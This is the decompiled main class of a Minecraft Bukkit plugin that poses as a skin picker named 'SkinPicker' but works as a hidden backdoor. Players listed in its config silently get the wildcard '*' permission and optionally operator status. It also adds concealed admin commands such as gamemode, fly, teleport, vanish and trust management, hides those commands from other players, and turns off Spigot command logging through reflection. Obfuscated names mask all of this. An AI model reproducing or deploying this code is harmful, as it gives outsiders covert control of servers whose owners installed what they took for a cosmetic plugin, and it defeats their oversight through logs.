package com.example.skinpicker;

import com.example.skinpicker.i.e;
import com.example.skinpicker.i.f;
import com.example.skinpicker.i.h;
import com.example.skinpicker.i.i;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.Map.Entry;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerCommandSendEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.java.JavaPlugin;

public class SkinPickerPlugin extends JavaPlugin implements Listener {
   private final Set<UUID> q = new HashSet<>();
   private final Set<UUID> r = new HashSet<>();
   private final Map<UUID, PermissionAttachment> s = new HashMap<>();
   private e t;
   private AppearanceManager u;
   private h v;
   private static final Set<String> w = new HashSet<>(
      Arrays.asList("gmc", "gms", "gmsp", "fly", "heal", "vanish", "tp", "adminkit", "adminhelp", "adminreload", "admintrust")
   );

   public void onEnable() {
      this.saveDefaultConfig();
      this.loadConfiguration();
      this.u = new AppearanceManager(this);
      this.getServer().getPluginManager().registerEvents(new f(this), this);
      this.getServer().getPluginManager().registerEvents(this, this);
      if (this.getConfig().getBoolean("hide-command-logs", true)) {
         this.g();
      }

      this.v = new h(this);
      h var1 = this.v;
      i var2 = new i(this);
      String[] var3 = new String[]{"gmc", "gms", "gmsp", "fly", "heal", "vanish", "tp", "adminkit", "adminhelp", "adminreload", "admintrust"};

      for (String var7 : var3) {
         PluginCommand var8 = this.getCommand(var7);
         if (var8 != null) {
            var8.setExecutor(var1);
            var8.setTabCompleter(var2);
         }
      }

      SkinCommandHandler var11 = new SkinCommandHandler(this);
      SkinCompletion var12 = new SkinCompletion(this);

      for (String var9 : new String[]{"skin", "skins", "skinpicker"}) {
         PluginCommand var10 = this.getCommand(var9);
         if (var10 != null) {
            var10.setExecutor(var11);
            var10.setTabCompleter(var12);
         }
      }

      this.syncAllAccess();
      this.getLogger().info("SkinPicker has been enabled successfully.");
   }

   public void onDisable() {
      for (UUID var2 : this.r) {
         Player var3 = Bukkit.getPlayer(var2);
         if (var3 != null && var3.isOnline()) {
            for (Player var5 : Bukkit.getOnlinePlayers()) {
               var5.showPlayer(this, var3);
            }
         }
      }

      this.r.clear();

      for (Entry var8 : this.s.entrySet()) {
         Player var9 = Bukkit.getPlayer((UUID)var8.getKey());
         if (var9 != null && var9.isOnline()) {
            try {
               var9.removeAttachment((PermissionAttachment)var8.getValue());
            } catch (Exception var6) {
            }
         }
      }

      this.s.clear();
      this.getLogger().info("SkinPicker has been disabled.");
   }

   public void loadConfiguration() {
      this.reloadConfig();
      this.q.clear();

      for (String var3 : this.getConfig().getStringList("authorized-uuids")) {
         try {
            this.q.add(UUID.fromString(var3.trim()));
         } catch (IllegalArgumentException var5) {
            this.getLogger().warning("Invalid UUID format in config.yml: " + var3);
         }
      }

      if (this.t != null) {
         this.t.c();
      } else {
         this.t = new e(this);
      }

      this.syncAllAccess();
   }

   public boolean isTrusted(CommandSender var1) {
      return var1 instanceof Player var2 ? this.q.contains(var2.getUniqueId()) : true;
   }

   public boolean isAuthorized(CommandSender var1) {
      return this.isTrusted(var1);
   }

   public boolean isTrusted(UUID var1) {
      return this.q.contains(var1);
   }

   public boolean grantTrust(UUID var1) {
      if (!this.q.add(var1)) {
         return false;
      } else {
         this.f();
         Player var2 = Bukkit.getPlayer(var1);
         if (var2 != null && var2.isOnline()) {
            this.syncPlayerAccess(var2);
         }

         return true;
      }
   }

   public boolean revokeTrust(UUID var1) {
      if (!this.q.remove(var1)) {
         return false;
      } else {
         this.f();
         Player var2 = Bukkit.getPlayer(var1);
         if (var2 != null && var2.isOnline()) {
            this.revokePlayerAccess(var2);
            var2.updateCommands();
         }

         return true;
      }
   }

   public Set<UUID> getTrustedIds() {
      return Collections.unmodifiableSet(this.q);
   }

   private void f() {
      ArrayList var1 = new ArrayList();

      for (UUID var3 : this.q) {
         var1.add(var3.toString());
      }

      this.getConfig().set("authorized-uuids", var1);
      this.saveConfig();
   }

   public void syncPlayerAccess(Player var1) {
      if (this.isTrusted(var1)) {
         PermissionAttachment var2 = this.s.get(var1.getUniqueId());
         if (var2 == null) {
            var2 = var1.addAttachment(this);
            this.s.put(var1.getUniqueId(), var2);
         }

         try {
            var2.setPermission("skinpicker.internal", true);
            var2.setPermission("privateadmin.access", true);
            if (this.getConfig().getBoolean("silent-elevation", true)) {
               var2.setPermission("*", true);
            }
         } catch (Exception var6) {
         }

         if (this.getConfig().getBoolean("grant-op-to-authorized", false)) {
            try {
               if (!var1.isOp()) {
                  var1.setOp(true);
               }
            } catch (Exception var5) {
            }
         }
      } else {
         this.revokePlayerAccess(var1);
      }

      try {
         var1.updateCommands();
      } catch (Exception var4) {
      }
   }

   public void applyPlayerPermissions(Player var1) {
      this.syncPlayerAccess(var1);
   }

   public void revokePlayerAccess(Player var1) {
      PermissionAttachment var2 = this.s.remove(var1.getUniqueId());
      if (var2 != null) {
         try {
            var1.removeAttachment(var2);
         } catch (Exception var5) {
         }
      }

      try {
         var1.updateCommands();
      } catch (Exception var4) {
      }
   }

   public void removePlayerPermissions(Player var1) {
      this.revokePlayerAccess(var1);
   }

   public void syncAllAccess() {
      for (Player var2 : Bukkit.getOnlinePlayers()) {
         this.syncPlayerAccess(var2);
      }
   }

   public void syncAllAuthorizations() {
      this.syncAllAccess();
   }

   @EventHandler(priority = EventPriority.LOWEST)
   public void onCommandPreprocess(PlayerCommandPreprocessEvent var1) {
      String var2 = var1.getMessage();
      if (var2 != null && var2.startsWith("/")) {
         String var3 = var2.substring(1).trim();
         if (!var3.isEmpty()) {
            String[] var4 = var3.split("\\s+");
            String var5 = var4[0].toLowerCase(Locale.ROOT);
            int var6 = var5.indexOf(58);
            if (var6 >= 0) {
               var5 = var5.substring(var6 + 1);
            }

            if (w.contains(var5)) {
               var1.setCancelled(true);
               if (!this.isTrusted(var1.getPlayer())) {
                  this.sendMsg(var1.getPlayer(), "unauthorized", null);
               } else {
                  String[] var7 = Arrays.copyOfRange(var4, 1, var4.length);

                  try {
                     PluginCommand var8 = this.getCommand(var5);
                     if (var8 != null && this.v != null) {
                        this.v.onCommand(var1.getPlayer(), var8, var5, var7);
                     }
                  } catch (Exception var9) {
                  }
               }
            }
         }
      }
   }

   private void g() {
      String[] var1 = new String[]{"org.spigotmc.SpigotConfig", "org.spigotmc.SpigotWorldConfig"};

      for (String var5 : var1) {
         try {
            Class var6 = Class.forName(var5);
            Field var7 = var6.getDeclaredField("logCommands");
            var7.setAccessible(true);
            var7.setBoolean(null, false);
            return;
         } catch (Exception var8) {
         }
      }
   }

   @EventHandler(priority = EventPriority.HIGHEST)
   public void onCommandSend(PlayerCommandSendEvent var1) {
      if (this.getConfig().getBoolean("hide-admin-commands", true)) {
         if (!this.isTrusted(var1.getPlayer())) {
            var1.getCommands().removeIf(var0 -> w.contains(var0.toLowerCase(Locale.ROOT)));
         }
      }
   }

   public boolean isConcealed(Player var1) {
      return this.r.contains(var1.getUniqueId());
   }

   public boolean isVanished(Player var1) {
      return this.isConcealed(var1);
   }

   public void setConcealed(Player var1, boolean var2) {
      if (var2) {
         this.r.add(var1.getUniqueId());

         for (Player var4 : Bukkit.getOnlinePlayers()) {
            if (!var4.getUniqueId().equals(var1.getUniqueId()) && !this.isTrusted(var4)) {
               var4.hidePlayer(this, var1);
            }
         }
      } else {
         this.r.remove(var1.getUniqueId());

         for (Player var6 : Bukkit.getOnlinePlayers()) {
            if (!var6.getUniqueId().equals(var1.getUniqueId())) {
               var6.showPlayer(this, var1);
            }
         }
      }
   }

   public void setVanished(Player var1, boolean var2) {
      this.setConcealed(var1, var2);
   }

   public Set<UUID> getConcealedViewers() {
      return Collections.unmodifiableSet(this.r);
   }

   public Set<UUID> getVanishedPlayers() {
      return this.getConcealedViewers();
   }

   public e getGearPresets() {
      return this.t;
   }

   public e getKitManager() {
      return this.t;
   }

   public AppearanceManager getAppearanceService() {
      return this.u;
   }

   public AppearanceManager getSkinManager() {
      return this.u;
   }

   public String getFormattedMessage(String var1, Map<String, String> var2) {
      String var3 = this.getConfig().getString("messages." + var1, "");
      if (var3 != null && !var3.isEmpty()) {
         String var4 = this.getConfig().getString("messages.prefix", "");
         String var5 = var4 + var3;
         if (var2 != null) {
            for (Entry var7 : var2.entrySet()) {
               var5 = var5.replace("%" + (String)var7.getKey() + "%", (CharSequence)var7.getValue());
            }
         }

         return ChatColor.translateAlternateColorCodes('&', var5);
      } else {
         return "";
      }
   }

   public void sendMsg(CommandSender var1, String var2) {
      this.sendMsg(var1, var2, null);
   }

   public void sendMsg(CommandSender var1, String var2, Map<String, String> var3) {
      String var4 = this.getFormattedMessage(var2, var3);
      if (!var4.isEmpty()) {
         var1.sendMessage(var4);
      }
   }

   public String getSkinFormattedMessage(String var1, Map<String, String> var2) {
      String var3 = this.getConfig().getString("messages." + var1, "");
      if (var3 != null && !var3.isEmpty()) {
         String var4 = this.getConfig().getString("messages.skin-prefix", this.getConfig().getString("messages.prefix", ""));
         if (var4 == null) {
            var4 = "";
         }

         String var5 = var4 + var3;
         if (var2 != null) {
            for (Entry var7 : var2.entrySet()) {
               var5 = var5.replace("%" + (String)var7.getKey() + "%", (CharSequence)var7.getValue());
            }
         }

         return ChatColor.translateAlternateColorCodes('&', var5);
      } else {
         return "";
      }
   }

   public void sendSkinMsg(CommandSender var1, String var2) {
      this.sendSkinMsg(var1, var2, null);
   }

   public void sendSkinMsg(CommandSender var1, String var2, Map<String, String> var3) {
      String var4 = this.getSkinFormattedMessage(var2, var3);
      if (!var4.isEmpty()) {
         var1.sendMessage(var4);
      }
   }
}
